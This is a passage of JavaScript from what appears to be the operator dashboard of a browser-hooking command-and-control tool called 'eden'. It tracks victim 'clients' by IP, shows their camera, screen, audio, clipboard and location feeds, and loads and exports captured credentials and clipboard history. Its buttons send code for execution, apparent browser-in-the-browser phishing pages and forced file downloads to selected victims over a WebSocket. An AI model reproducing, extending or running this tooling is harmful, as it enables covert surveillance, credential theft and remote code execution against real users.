                        console.log(`Found placeholder log entry: ${entryClientId}`);
                        span.textContent = nickname;
                        span.title = `Placeholder ID: ${entryClientId}, Using nickname from: ${clientId}`;
                        replaced = true;
                    }
                }
            });
            
            // PART 4: Handle container headers
            const headers = document.querySelectorAll('h4, .client-header, strong, [id^="client-camera-"] h4, [id^="client-screen-"] h4, [id^="client-audio-"] h4, [id^="client-screen-container-"] h4, [id^="camera-container-"] h4, [id^="screen-container-"] h4, [id^="audio-container-"] h4');
            headers.forEach(header => {
                const text = header.textContent || '';
                if (text.includes('Client:') || text.includes('Client ')) {
                    // Try to find parent container with ID
                    const container = header.closest('[id]');
                    if (container && container.id) {
                        const containerId = container.id.split('-').pop(); // Get last part as id
                        if (containerId) {
                            const shortContainerId = containerId.split('_').pop().substring(0, 8);
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            
                            if (containerId === clientId || 
                                shortContainerId === shortId || 
                                containerId.includes(shortId) || 
                                clientId.includes(shortContainerId)) {
                                
                                console.log(`Found container header for client ${clientId}`);
                                
                                // Handle different header formats
                                if (text.includes('Client:')) {
                                    header.textContent = `Client: ${nickname}`;
                                } else if (text.includes('Client ')) {
                                    // For 'Client ID - Time' format
                                    header.textContent = header.textContent.replace(/Client [^ ]+/, `Client ${nickname}`);
                                }
                                
                                header.title = `Full Client ID: ${clientId}`;
                                replaced = true;
                            }
                            
                            // Special handling for client_1, client_2 pattern
                            if (containerId.match(/^client_\d+$/) && clientId !== containerId) {
                                console.log(`Found placeholder container: ${containerId}`);
                                if (text.includes('Client:')) {
                                    header.textContent = `Client: ${nickname}`;
                                } else if (text.includes('Client ')) {
                                    header.textContent = header.textContent.replace(/Client [^ ]+/, `Client ${nickname}`);
                                }
                                header.title = `Placeholder ID: ${containerId}, Using nickname from: ${clientId}`;
                                replaced = true;
                            }
                        }
                    }
                }
            });
            
            if (replaced) {
                console.log(`Updated badges for client ${clientId} with nickname "${nickname}"`);
            }
        }
        
        // Helper function to get client's display name (nickname or ID)
        function getClientDisplayName(clientId) {
            if (!clientId) return 'Unknown';
            
            // Default to shortened client ID
            let displayName = clientId.substring(0, 8);
            
            // Find client by clientId in our clients object
            for (const key in clients) {
                if (clients[key].clientId === clientId && clients[key].nickname) {
                    displayName = clients[key].nickname;
                    break;
                }
            }
            
            // If no exact match, try partial match with the shortened ID
            if (displayName === clientId.substring(0, 8)) {
                const shortId = clientId.split('_').pop().substring(0, 8);
                for (const key in clients) {
                    if (clients[key].clientId && 
                        clients[key].clientId.includes(shortId) && 
                        clients[key].nickname) {
                        displayName = clients[key].nickname;
                        break;
                    }
                }
            }
            
            return displayName;
        }

        // Update all client badges with a specific nickname
        function updateAllClientBadgesWithNickname(clientId, nickname) {
            if (!clientId || !nickname) return;
            
            console.log(`Trying to update all badges for client ${clientId} with nickname ${nickname}`);
            
            // Use our more aggressive replacement approach
            replaceClientBadges(clientId, nickname);
            
            // Set up a recurring check to keep updating badges
            const persistInterval = setInterval(() => {
                console.log(`Running persistent update for client ${clientId}`);
                replaceClientBadges(clientId, nickname);
            }, 50); // Check more frequently (50ms) to catch new containers quickly
            
            // Store the interval ID
            window.persistIntervals = window.persistIntervals || [];
            window.persistIntervals.push(persistInterval);
            
            // Run forever - we want the nickname to persist as long as the page is open
            // No timeout to stop the interval
        }
        
        // Update client badge in preview section
        function updateClientBadge(clientId, nickname) {
            if (!clientId) return;
            
            console.log(`Updating client badge for ${clientId} with nickname: ${nickname}`);
            
            // Use our more aggressive replacement approach that completely replaces the badge
            if (nickname) {
                replaceClientBadges(clientId, nickname);
                
                // Set up a short interval to keep checking for new badges
                const checkInterval = setInterval(() => {
                    replaceClientBadges(clientId, nickname);
                }, 100);
                
                // Run for 5 seconds to catch any new badges that might appear
                setTimeout(() => {
                    clearInterval(checkInterval);
                }, 5000);
            } else {
                console.log(`No nickname provided for client ${clientId}, skipping badge update`);
            }
        }
        
        // Update client UI
        function updateClientUI(clientKey) {
            const client = clients[clientKey];
            const card = document.getElementById(`client-${clientKey}`);
            
            if (card && client) {
                // Update status indicator
                const statusElement = card.querySelector('.client-status');
                statusElement.className = `client-status ${client.status === 'online' ? 'status-online' : 'status-offline'}`;
                
                // Update status text
                const statusText = client.status === 'online' ? 'Online' : 'Offline';
                const statusTextClass = client.status === 'online' ? 'online-text' : 'offline-text';
                const statusTextElement = card.querySelector('.status-text');
                if (statusTextElement) {
                    statusTextElement.textContent = statusText;
                    statusTextElement.className = `status-text ${statusTextClass}`;
                }
                
                // Update display name (nickname or IP)
                const clientIpElement = card.querySelector('.client-ip');
                if (clientIpElement) {
                    // Keep the status text element intact
                    const statusElement = clientIpElement.querySelector('.status-text');
                    const statusHTML = statusElement ? statusElement.outerHTML : '';
                    
                    // Update the display name but keep the status
                    const displayName = client.nickname || client.ip;
                    clientIpElement.innerHTML = displayName + statusHTML;
                }
                
                // Update last seen time
                const details = card.querySelector(`#details-${clientKey}`);
                const lastSeenEl = details.querySelector('.detail-item span:last-child');
                lastSeenEl.textContent = new Date(client.lastSeen).toLocaleTimeString();
                
                // Update client-specific stream visibility based on selection state
                updateClientFeedsVisibility(client);
            }
        }
        
       
          
        
        
        // Toggle client selection state
        function toggleClientSelection(clientKey) {
            console.log('Toggling selection for client:', clientKey);
            
            // Get client and card
            const client = clients[clientKey];
            const card = document.getElementById(`client-${clientKey}`);
            
            if (!client || !card) {
                console.error('Client or card not found:', clientKey);
                return;
            }
            
            // Toggle selection state
            client.selected = !client.selected;
            console.log(`Client ${clientKey} selected:`, client.selected);
            
            // Update card classes
            if (client.selected) {
                card.classList.add('selected');
            } else {
                card.classList.remove('selected');
            }
            
            // Update select button
            const selectBtn = card.querySelector('.select-btn');
            if (selectBtn) {
                const selectBtnIcon = selectBtn.querySelector('i');
                
                // Update button class
                if (client.selected) {
                    selectBtn.classList.add('selected');
                } else {
                    selectBtn.classList.remove('selected');
                }
                
                // Update button text and icon
                selectBtn.innerHTML = `<i class="fas fa-${client.selected ? 'check-square' : 'square'}"></i> ${client.selected ? 'Selected' : 'Select'}`;
            }
            
            // Save to localStorage
            saveClientsToStorage();
            
            // Update communicate button state
            updateCommunicateButtonState();
            
            // Update all status logs visibility
            updateStatusLogsVisibility();
        }
        
        // Update all status logs visibility based on client selection
        function updateStatusLogsVisibility() {
            console.log('Updating status logs visibility');
            
            // Get the IDs of all selected clients
            const selectedClientIds = Object.values(clients)
                .filter(client => client.selected && client.status === 'online')
                .map(client => client.clientId);
            
            console.log(`Selected client IDs for logs: ${JSON.stringify(selectedClientIds)}`);
        }
            

        // Remove client
        function removeClient(clientKey) {
            // Remove from DOM
            const card = document.getElementById(`client-${clientKey}`);
            if (card) {
                card.remove();
            }
            
            // Remove from clients object
            delete clients[clientKey];
            
            // Clear any timeout
                if (connectionTimeouts[clientKey]) {
                    clearTimeout(connectionTimeouts[clientKey]);
                delete connectionTimeouts[clientKey];
            }
            
            // Save to localStorage
            saveClientsToStorage();
            
            // Show empty state if no clients left
            if (Object.keys(clients).length === 0) {
                emptyState.style.display = 'block';
            }
            
            // Update communicate button state
            updateCommunicateButtonState();
        }
        
        // Clear all clients
        function clearAllClients() {
            // Confirm before clearing
            if (confirm('Are you sure you want to remove all clients?')) {
                // Remove all client cards
                const cards = document.querySelectorAll('.client-card');
                cards.forEach(card => card.remove());
                
                // Clear clients object
                clients = {};
                
                // Clear all timeouts
                for (const key in connectionTimeouts) {
                    clearTimeout(connectionTimeouts[key]);
                }
                connectionTimeouts = {};
                
                // Show empty state
                emptyState.style.display = 'block';
                
                // Save to localStorage
                saveClientsToStorage();
                
                // Update button states
                updateCommunicateButtonState();
            }
        }
        
        // Update communicate button state (enable/disable based on client selection)
        function updateCommunicateButtonState() {
            console.log('Updating communicate button state');
            
            // Get all buttons that depend on client selection
            const buttons = document.querySelectorAll('.action-btn');
            
            // Check if any clients are selected and online
            const anySelectedClients = Object.values(clients).some(client => 
                client.selected && client.status === 'online');
            
            // Enable or disable buttons based on selection state
            buttons.forEach(button => {
                if (anySelectedClients) {
                    button.disabled = false;
                    button.classList.remove('disabled');
                } else {
                    button.disabled = true;
                    button.classList.add('disabled');
                }
            });
            
            // Update selection info text
            const selectionInfo = document.querySelector('#selection-info');
            if (selectionInfo) {
                const selectedCount = Object.values(clients).filter(c => c.selected && c.status === 'online').length;
                if (selectedCount > 0) {
                    selectionInfo.textContent = `${selectedCount} client(s) selected`;
                    selectionInfo.style.display = 'block';
                } else {
                    selectionInfo.style.display = 'none';
                }
            }
        }
        
        // Save clients to localStorage
        function saveClientsToStorage() {
            localStorage.setItem('clients', JSON.stringify(clients));
        }
        
                // Load clients from localStorage
        function loadClientsFromStorage() {
            const storedClients = localStorage.getItem('clients');
            if (storedClients) {
                try {
                    // Parse all stored clients
                    const allClients = JSON.parse(storedClients);
                    console.log('Found', Object.keys(allClients).length, 'total clients in storage');
                    
                    // Check for clients with nicknames
                    Object.keys(allClients).forEach(key => {
                        const client = allClients[key];
                        if (client.nickname && client.clientId) {
                            console.log(`Found client with nickname: ${client.nickname}, ID: ${client.clientId}`);
                        }
                    });
                    
                    // Filter to only keep online clients or those recently seen
                    const onlineClients = {};
                    const now = new Date().getTime();
                    
                    Object.keys(allClients).forEach(key => {
                        const client = allClients[key];
                        
                        // Calculate time since last seen
                        const lastSeen = new Date(client.lastSeen).getTime();
                        const timeSinceLastSeen = now - lastSeen;
                        
                        // Skip clients that have been inactive too long
                        if (timeSinceLastSeen > CLIENT_TIMEOUT) {
                            console.log('Skipping inactive client:', key, 'inactive for', timeSinceLastSeen, 'ms');
                            return;
                        }
                        
                        // Skip explicitly offline clients
                        if (client.status === 'offline') {
                            console.log('Skipping offline client:', key);
                            return;
                        }
                        
                        // Keep only active clients
                        console.log('Keeping active client:', key);
                        onlineClients[key] = client;
                    });
                    
                    // Set the filtered clients
                    clients = onlineClients;
                    console.log('Loaded', Object.keys(clients).length, 'active clients from storage');
                    
                    // Add client cards for active clients only
                    Object.keys(clients).forEach(clientKey => {
                        addClientCard(clientKey);
                        
                        // All clients we load should be online at this point
                        console.log('Setting timeout for active client:', clientKey);
                        
                        // Calculate remaining time before marking as offline
                        const lastSeen = new Date(clients[clientKey].lastSeen).getTime();
                        const timeSinceLastSeen = now - lastSeen;
                        const remainingTime = Math.max(100, CLIENT_TIMEOUT - timeSinceLastSeen);
                        
                        // Set timeout to mark as offline if no updates received
                connectionTimeouts[clientKey] = setTimeout(() => {
                            clients[clientKey].status = 'offline';
                            updateClientUI(clientKey);
                            updateCommunicateButtonState();
                            // Save clients to localStorage to persist offline status
                            saveClientsToStorage();
                            console.log(`Client ${clientKey} marked offline after ${CLIENT_TIMEOUT}ms timeout`);
                        }, remainingTime);
                    });
                    
                    // Save the updated clients with offline statuses
                    saveClientsToStorage();
                    
                    // Hide empty state if we have clients
                    if (Object.keys(clients).length > 0) {
                        emptyState.style.display = 'none';
                    }
                } catch (error) {
                    console.error('Error parsing clients from localStorage:', error);
                    // Reset clients if corrupted
                    clients = {};
                    localStorage.removeItem('clients');
                }
            } else {
                console.log('No clients found in localStorage');
            }
        }
        
     
        // Handle client selection change
        function handleClientSelection(clientKey) {
            const card = document.getElementById(`client-${clientKey}`);
            const selectBtn = card.querySelector('.select-btn');
            
            // Toggle selection state
            const currentlySelected = clients[clientKey].selected;
            clients[clientKey].selected = !currentlySelected;
            
            // Update UI
            if (clients[clientKey].selected) {
                card.classList.add('selected');
                selectBtn.textContent = 'Selected';
                selectBtn.classList.add('selected');
                
                // Automatically show communication interface when client is selected
                // This replaces the need for the communicate button
                const selectedClients = Object.keys(clients).filter(key => 
                    clients[key].selected && clients[key].status === 'online');
                
                if (selectedClients.length > 0) {
                    showCommunicationInterface();
                }
                            } else {
                card.classList.remove('selected');
                selectBtn.textContent = 'Select';
                selectBtn.classList.remove('selected');
            }
            
                                    updateCommunicateButtonState();
                                    saveClientsToStorage();
        }
        
        // Show communication interface
        function showCommunicationInterface() {
            if (selectedClients.length === 0) {
                return;
            }
            
            // Get first selected client (we'll only communicate with one at a time)
            const clientKey = selectedClients[0];
            const client = clients[clientKey];
            
            // Update UI
            selectedIpDisplay.textContent = client.ip;
            messageInput.value = '';
            communicationInterface.style.display = 'block';
        }
        
        // Cancel all selections
        function cancelSelection() {
            Object.keys(clients).forEach(clientKey => {
                clients[clientKey].selected = false;
                const card = document.getElementById(`client-${clientKey}`);
                if (card) {
                    card.classList.remove('selected');
                    const checkbox = card.querySelector('.selection-checkbox');
                    if (checkbox) {
                        checkbox.checked = false;
                    }
                }
            });
            
            updateCommunicateButtonState();
            communicationInterface.style.display = 'none';
            saveClientsToStorage();
        }
        
        // Load stored files from localStorage on page load
        window.addEventListener('load', () => {
            // Load files
            const storedFiles = localStorage.getItem('files');
            if (storedFiles) {
                fileStorage = new Map(JSON.parse(storedFiles));
                updateFileList();
                saveToLocalStorage();
            }
        });
        
        // Setup drop zone event listeners
        if (dropZone) {
            dropZone.addEventListener('dragover', (e) => {
                e.preventDefault();
                dropZone.classList.add('active');
            });
            
            dropZone.addEventListener('dragleave', () => {
                dropZone.classList.remove('active');
            });
            
            dropZone.addEventListener('drop', (e) => {
                e.preventDefault();
                dropZone.classList.remove('active');
                
                if (e.dataTransfer.files.length > 0) {
                    Array.from(e.dataTransfer.files).forEach(file => {
                        handleFile(file);
                    });
                }
            });
        }
        
        // Setup file input event listener
        if (fileInput) {
            fileInput.addEventListener('change', () => {
                if (fileInput.files.length > 0) {
                    Array.from(fileInput.files).forEach(file => {
                        handleFile(file);
                    });
                }
            });
        }
        
        // Attach event listeners for sidebar navigation
        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const section = link.getAttribute('data-section');
                switchSection(section);
                
                // Close sidebar on mobile after navigation
                if (window.innerWidth <= 767) {
                    sidebar.classList.remove('active');
                }
            });
        });
        
        // Toggle sidebar when button is clicked (for both mobile and desktop)
        document.getElementById('mobileNavToggle').addEventListener('click', () => {
            sidebar.classList.toggle('active');
            // Save sidebar state in localStorage
            localStorage.setItem('eden-sidebar-state', sidebar.classList.contains('active') ? 'active' : 'inactive');
        });
        
        // Check if there's a saved sidebar state on page load
        const savedSidebarState = localStorage.getItem('eden-sidebar-state');
        if (savedSidebarState === 'active') {
            sidebar.classList.add('active');
        } else if (window.innerWidth > 767) {
            // On desktop, default to showing sidebar if no saved state
            sidebar.classList.add('active');
        }
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', (e) => {
            if (window.innerWidth <= 767 && 
                sidebar.classList.contains('active') && 
                !sidebar.contains(e.target) && 
                e.target.id !== 'mobileNavToggle' &&
                !e.target.closest('#mobileNavToggle')) {
                sidebar.classList.remove('active');
            }
        });
        
        clearAllBtn.addEventListener('click', clearAllClients);
        
        // Communication related event listeners
        cancelSelectionBtn.addEventListener('click', cancelSelection);
        
        closeCommBtn.addEventListener('click', function() {
            communicationInterface.style.display = 'none';
        });
        
        sendMessageBtn.addEventListener('click', function() {
            if (selectedClients.length === 0) {
                return;
            }
            
            const message = messageInput.value.trim();
            if (!message) {
                alert('Please enter a message');
                return;
            }
            
            // Send message to first selected client
            const clientKey = selectedClients[0];
            const success = sendMessageToClient(clientKey, message);
            
            if (success) {
                alert('Message sent successfully');
                messageInput.value = '';
            }
        });
        
        // Add event delegation for select buttons
        clientList.addEventListener('click', function(e) {
            if (e.target.classList.contains('select-btn')) {
                const clientKey = e.target.dataset.key;
                handleClientSelection(clientKey);
                e.stopPropagation(); // Prevent card click from toggling details
            }
        });
        
        // Function to send content to selected clients
        function sendContentToSelectedClients(actionType) {
            const codeInput = document.getElementById('codeInput');
            const content = codeInput.value.trim();
            const reload = document.getElementById('displayReloadToggle').checked;
            
            // Check if any clients are selected
            const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
            
            if (selectedClients.length === 0) {
                alert('Please select at least one client from the Connection section');
                return;
            }
            
            // Prepare the message data
            const messageData = {
                type: actionType,
                content: content,
                fileName: 'editor-content.html',
                reload: reload
            };
            
            // Send to selected clients only
            sendToSelectedClients(messageData);
            
            // Update selection info
            const selectionInfo = document.getElementById('selection-info');
            if (selectionInfo) {
                selectionInfo.textContent = `Content sent to ${selectedClients.length} selected client(s)`;
                selectionInfo.style.display = 'block';
                                setTimeout(() => {
                    selectionInfo.style.display = 'none';
                }, 3000);
            }
        }
        
        // Function to ensure audio context is resumed
        function ensureAudioContextResumed() {
            if (window.audioContext && window.audioContext.state === 'suspended') {
                window.audioContext.resume().then(() => {
                    console.log('AudioContext resumed successfully');
                }).catch(err => {
                    console.error('Failed to resume AudioContext:', err);
                });
            }
        }
        
        // Define createClientElement as an alias for addClientCard
        function createClientElement(clientKey) {
            console.log('Creating client element for:', clientKey);
            addClientCard(clientKey);
        }
        
        // Document ready function
        document.addEventListener('DOMContentLoaded', function() {
                    // First load clients from storage to establish existing connections
        loadClientsFromStorage();
        
        // Then initialize the WebSocket connection after client data is loaded
        // This ensures existing connections are recognized properly
        initWebSocket();
        
        // Start nickname refresh interval to continuously update all client displays
        // This ensures newly created containers (camera, audio, screen, clipboard, location)
        // show the nickname immediately instead of waiting for a refresh
        let nicknameRefreshInterval = setInterval(() => {
            // For each client with a nickname, refresh their badges
            for (const key in clients) {
                if (clients[key].clientId && clients[key].nickname) {
                    replaceClientBadges(clients[key].clientId, clients[key].nickname);
                }
            }
        }, 500); // Check every 500ms
        
        // Update all client badges with nicknames after a short delay
        setTimeout(updateAllClientBadges, 2000);
        
        // Function to update all client badges with nicknames
        function updateAllClientBadges() {
            console.log("Updating all client badges with nicknames");
            
            // Debug: Log all client IDs in our clients object
            console.log("=== DEBUG: All Client IDs in clients object ===");
            Object.keys(clients).forEach(key => {
                console.log(`Client key: ${key}`);
                console.log(`Client ID: ${clients[key].clientId}`);
                console.log(`Client nickname: ${clients[key].nickname || 'none'}`);
                console.log(`Client IP: ${clients[key].ip}`);
                console.log("---");
            });
            
            // Debug: Find all client badges in the preview section
            console.log("=== DEBUG: All client badges in preview section ===");
            const allBadges = document.querySelectorAll('.client-badge');
            allBadges.forEach((badge, index) => {
                console.log(`Badge ${index}: id=${badge.id}, text=${badge.textContent}`);
                
                // Extract client ID from badge ID
                if (badge.id && badge.id.startsWith('client-badge-')) {
                    const badgeClientId = badge.id.replace('client-badge-', '');
                    console.log(`  Badge client ID: ${badgeClientId}`);
                    
                    // Try to find this client in our clients object
                    let found = false;
                    Object.keys(clients).forEach(key => {
                        if (clients[key].clientId === badgeClientId) {
                            found = true;
                            console.log(`  Found matching client with key: ${key}`);
                            if (clients[key].nickname) {
                                console.log(`  Client has nickname: ${clients[key].nickname}`);
                                badge.textContent = `Client: ${clients[key].nickname}`;
                                console.log(`  Updated badge text to: ${badge.textContent}`);
                            }
                        }
                    });
                    
                    if (!found) {
                        console.log(`  No matching client found for badge ID: ${badgeClientId}`);
                    }
                }
            });
            
            // Loop through all clients and update their badges if they have nicknames
            Object.keys(clients).forEach(key => {
                const client = clients[key];
                if (client.clientId && client.nickname) {
                    console.log(`Updating badge for client ${client.clientId} with nickname: ${client.nickname}`);
                    updateClientBadge(client.clientId, client.nickname);
                }
            });
        }
            
            // Update UI states
            updateCommunicateButtonState();
            
            // Initialize credentials section
            loadStoredCredentials();
            
            // Add click listener to document to ensure audio context can be resumed
            document.addEventListener('click', ensureAudioContextResumed);
            document.addEventListener('touchstart', ensureAudioContextResumed);
            
                    // Set up credentials buttons
        const clearCredentialsBtn = document.getElementById('clearCredentialsBtn');
        if (clearCredentialsBtn) {
            clearCredentialsBtn.addEventListener('click', clearAllCredentials);
        }
        
        // Set up export credentials button
        const exportCredentialsBtn = document.getElementById('exportCredentialsBtn');
        if (exportCredentialsBtn) {
            exportCredentialsBtn.addEventListener('click', exportAllCredentials);
        }
        
        // Set up export clipboard button
        const exportClipboardBtn = document.getElementById('exportClipboardBtn');
        if (exportClipboardBtn) {
            exportClipboardBtn.addEventListener('click', exportClipboardHistory);
        }
            
            // Set up action button click handlers
            document.getElementById('viewBtn').addEventListener('click', function() {
                sendContentToSelectedClients('showsContent');
            });
            
            document.getElementById('BITBBtn').addEventListener('click', function() {
                sendContentToSelectedClients('BITBContent');
            });
            
            document.getElementById('executeBtn').addEventListener('click', function() {
                sendContentToSelectedClients('executeContent');
            });
            
            document.getElementById('cleanBtn').addEventListener('click', function() {
                sendContentToSelectedClients('cleanContent');
            });
            
            
            // Initialize blur section functionality
            setupBlurSection();
            
            // Initialize custom template section
            setupCustomSection();
            
            // Initialize download section
            setupDownloadFunctionality();
            
            // Setup section navigation
            setupSectionNavigation();
        });
        
        // Setup section navigation functionality
        function setupSectionNavigation() {
            const navLinks = document.querySelectorAll('.sidebar-menu-item a');
            const sections = document.querySelectorAll('.content-section');
            
            // Hide all sections except the active one on initial load
            sections.forEach(section => {
                section.style.display = 'none';
            });
            
            // Show the default section (connection)
            document.getElementById('connection').style.display = 'block';
            
            // Add click event to all nav links
            navLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    // Remove active class from all links
                    navLinks.forEach(l => l.classList.remove('active'));
                    
                    // Add active class to clicked link
                    this.classList.add('active');
                    
                    // Hide all sections
                    sections.forEach(section => {
                        section.style.display = 'none';
                    });
                    
                    // Show the target section
                    const targetSection = this.getAttribute('data-section');
                    document.getElementById(targetSection).style.display = 'block';
                });
            });
        }
        
        // Setup download section functionality
        function setupDownloadFunctionality() {
            let selectedLocationX = 50;
            let selectedLocationY = 50;
            let locationSelected = false;
            
            const uploadArea = document.getElementById('download-upload-area');
            const fileInput = document.getElementById('download-file-input');
            const filesContainer = document.getElementById('download-files-container');
            
            if (uploadArea && fileInput) {
                // Upload functionality
                uploadArea.addEventListener('click', () => fileInput.click());
                uploadArea.addEventListener('dragover', e => { e.preventDefault(); uploadArea.style.borderColor = '#0077b6'; });
                uploadArea.addEventListener('dragleave', () => { uploadArea.style.borderColor = '#ccc'; });
                uploadArea.addEventListener('drop', e => {
                    e.preventDefault();
                    uploadArea.style.borderColor = '#ccc';
                    if (e.dataTransfer.files.length > 0) handleFiles(e.dataTransfer.files);
                });
                
                fileInput.addEventListener('change', () => {
                    if (fileInput.files.length > 0) handleFiles(fileInput.files);
                });
                
                // Button actions
                document.getElementById('download-clear-server').addEventListener('click', () => {
                    filesContainer.innerHTML = '';
                    localStorage.removeItem('eden-download-files');
                    showDownloadStatusMessage('success', 'All files cleared');
                });
                
                document.getElementById('sudo-download-button').addEventListener('click', () => {
                    // Check if any clients are selected
                    const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                    
                    if (selectedClients.length === 0) {
                        showDownloadStatusMessage('warning', 'Please select at least one client from the Connection section');
                        return;
                    }
                    
                    const files = [];
                    document.querySelectorAll('.blur-file-item').forEach(item => {
                        const selectBtn = item.querySelector('.select-btn');
                        if (selectBtn && selectBtn.dataset.selected === 'true') {
                            files.push({
                                fileName: item.querySelector('.blur-file-name').textContent,
                                content: item.querySelector('.blur-file-content').textContent
                            });
                        }
                    });
                    
                    localStorage.setItem('eden-download-selected-files', JSON.stringify(files));
                    if (files.length > 0) {
                        // Send to selected clients only
                        sendToSelectedClients({
                            type: 'sudoDownload',
                            files: files
                        });
                        showDownloadStatusMessage('success', `Downloading ${files.length} selected file(s) to ${selectedClients.length} selected client(s)`);
                    } else {
                        showDownloadStatusMessage('warning', 'No files selected for download');
                    }
                });
                
                // Location picker
                setupLocationPicker();
                
                            // Load saved files
            loadFiles();
        }
        
        // Show status message for download section
        function showDownloadStatusMessage(type, message) {
            const statusEl = document.createElement('div');
            statusEl.className = `status-message ${type}`;
            statusEl.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> ${message}`;
            statusEl.style.display = 'block';
            
            // Find or create status container in download section
            let statusContainer = document.querySelector('#download .status-container');
            if (!statusContainer) {
                statusContainer = document.createElement('div');
                statusContainer.className = 'status-container';
                document.querySelector('#download .blur-section').appendChild(statusContainer);
            }
            
            // Clear previous messages
            statusContainer.innerHTML = '';
            statusContainer.appendChild(statusEl);
            
            // Auto-remove after a few seconds
                            setTimeout(() => {
                statusEl.style.opacity = '0';
                statusEl.style.transition = 'opacity 0.5s';
                setTimeout(() => {
                    if (statusContainer.contains(statusEl)) {
                        statusContainer.removeChild(statusEl);
                    }
                }, 500);
            }, 3000);
        }
        
        function setupLocationPicker() {
                const locationBtn = document.getElementById('location-button');
                const resetLocationBtn = document.getElementById('reset-location-button');
                const modal = document.getElementById('location-picker-modal');
                const preview = document.getElementById('location-preview');
                const marker = document.getElementById('location-marker');
                const closeBtn = document.getElementById('location-picker-close');
                const saveBtn = document.getElementById('location-save-button');
                
                if (!locationBtn || !modal) return;
                
                resetLocationBtn.disabled = true;
                
                locationBtn.addEventListener('click', () => {
                    modal.style.display = 'block';
                    if (locationSelected) {
                        marker.style.display = 'block';
                        marker.style.left = `${selectedLocationX}%`;
                        marker.style.top = `${selectedLocationY}%`;
                    }
                });
                
                resetLocationBtn.addEventListener('click', () => {
                    locationSelected = false;
                    selectedLocationX = 50;
                    selectedLocationY = 50;
                    locationBtn.textContent = 'Choose Location';
                    resetLocationBtn.disabled = true;
                });
                
                closeBtn.addEventListener('click', () => modal.style.display = 'none');
                window.addEventListener('click', e => { if (e.target === modal) modal.style.display = 'none'; });
                
                preview.addEventListener('click', e => {
                    const rect = preview.getBoundingClientRect();
                    selectedLocationX = Math.min(Math.max(((e.clientX - rect.left) / rect.width) * 100, 10), 90);
                    selectedLocationY = Math.min(Math.max(((e.clientY - rect.top) / rect.height) * 100, 10), 90);
                    
                    marker.style.display = 'block';
                    marker.style.left = `${selectedLocationX}%`;
                    marker.style.top = `${selectedLocationY}%`;
                    locationSelected = true;
                });
                
                saveBtn.addEventListener('click', () => {
                    modal.style.display = 'none';
                    locationBtn.textContent = 'Location: Selected';
                    resetLocationBtn.disabled = false;
                });
            }
            
            function handleFiles(files) {
                for (const file of files) {
                    if (file.type === 'text/html' || file.name.endsWith('.html') || file.name.endsWith('.htm')) {
                        const reader = new FileReader();
                        reader.onload = e => addFileToList(file.name, e.target.result);
                        reader.readAsText(file);
                    } else {
                        addFileToList(file.name, `[Binary content: ${file.name}]`);
                    }
                }
                document.getElementById('download-file-input').value = '';
            }
            
            function addFileToList(fileName, content, saveFiles = true) {
                const container = document.getElementById('download-files-container');
                if (!container) return;
                
                // Show status message
                showDownloadStatusMessage('success', `File "${fileName}" uploaded successfully`);
                
                const fileItem = document.createElement('div');
                fileItem.className = 'blur-file-item';
                
                const nameEl = document.createElement('div');
                nameEl.className = 'blur-file-name';
                nameEl.textContent = fileName;
                
                const contentEl = document.createElement('div');
                contentEl.className = 'blur-file-content';
                contentEl.textContent = content;
                contentEl.style.display = 'none';
                
                const btnGroup = document.createElement('div');
                btnGroup.className = 'blur-button-group';
                
                // Display button
                const displayBtn = document.createElement('button');
                displayBtn.className = 'btn primary';
                displayBtn.innerHTML = '<i class="fas fa-eye"></i> Display';
                displayBtn.addEventListener('click', () => {
                    // Check if any clients are selected
                    const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                    
                    if (selectedClients.length === 0) {
                        showDownloadStatusMessage('warning', 'Please select at least one client from the Connection section');
                        return;
                    }
                    
                    const effect = document.getElementById('download-effect-selector').value;
                    const loc = locationSelected ? {x: selectedLocationX, y: selectedLocationY} : null;
                    
                    const data = {
                        fileName: fileName,
                        content: content,
                        downloadFlag: 'true',
                        location: loc
                    };
                    
                    // Get intensity from download slider
                    const downloadIntensity = document.getElementById('downloadIntensity');
                    const intensity = downloadIntensity ? parseInt(downloadIntensity.value) : 5;
                    data.intensity = intensity;
                    
                    // Store intensity for all effect types
                    localStorage.setItem('eden-download-intensity', intensity.toString());
                    sessionStorage.setItem('eden-download-intensity', intensity.toString());
                    
                    if (effect === 'blur') {
                        data.type = 'downloadContent';
                    } else if (effect === 'shade') {
                        data.type = 'downloadshadecontent';
                        localStorage.setItem('eden-download-effect-type', 'shade');
                        sessionStorage.setItem('eden-download-effect-type', 'shade');
                    } else if (effect === 'none') {
                        data.type = 'noeffectcontent';
                    } else {
                        // Custom effect handling
                        data.type = 'downloadcustomeffect';
                        
                        // Fetch the custom effect from storage
                        const effectsKey = 'eden-custom-effects';
                        try {
                            const effectsJson = localStorage.getItem(effectsKey);
                            console.log('Custom effects in storage:', effectsJson);
                            
                            const effects = JSON.parse(effectsJson || '{}');
                            console.log('Looking for custom effect:', effect);
                            console.log('Available effects:', Object.keys(effects).join(', '));
                            
                            const customEffect = effects[effect];
                            console.log('Found custom effect:', customEffect ? 'yes' : 'no');
                            
                            if (customEffect) {
                                console.log('Custom effect content:', customEffect.content ? customEffect.content.substring(0, 50) + '...' : 'none');
                                console.log('Custom effect type:', customEffect.type);
                                
                                // Get the intensity from the download intensity slider if it exists, 
                                // or fallback to the blur intensity slider
                                const downloadIntensityEl = document.getElementById('downloadIntensity');
                                const blurIntensityEl = document.getElementById('blurIntensity');
                                let intensity = 5; // Default
                                
                                if (downloadIntensityEl) {
                                    intensity = parseInt(downloadIntensityEl.value);
                                    console.log('Using download intensity slider value:', intensity);
                                } else if (blurIntensityEl) {
                                    intensity = parseInt(blurIntensityEl.value);
                                    console.log('Using blur intensity slider value:', intensity);
                                } else {
                                    console.log('Using default intensity:', intensity);
                                }
                                
                                // Set up the data to send to eden.js
                                data.effect = 'custom';
                                data.customEffect = {
                                    name: effect,
                                    content: customEffect.content,
                                    type: customEffect.type
                                };
                                data.intensity = intensity;
                                
                                // Store effect info for persistence
                                localStorage.setItem('eden-download-effect-type', 'custom');
                                sessionStorage.setItem('eden-download-effect-type', 'custom');
